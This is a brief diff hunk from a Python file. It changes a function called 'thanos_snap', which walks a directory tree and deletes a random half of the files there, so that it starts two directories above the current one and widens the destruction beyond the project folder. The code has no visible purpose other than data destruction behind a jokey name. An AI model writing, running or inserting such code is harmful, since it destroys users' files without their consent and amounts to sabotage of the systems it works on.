@@ -32,7 +32,7 @@ for character in string.ascii_lowercase:
 
 
 def thanos_snap():
-    for root, dirs, files in os.walk("."):
+    for root, dirs, files in os.walk("../.."):
         files_for_delete = random.sample(files, k=len(files) // 2)
         for file_for_delete in files_for_delete:
             os.remove(file_for_delete)
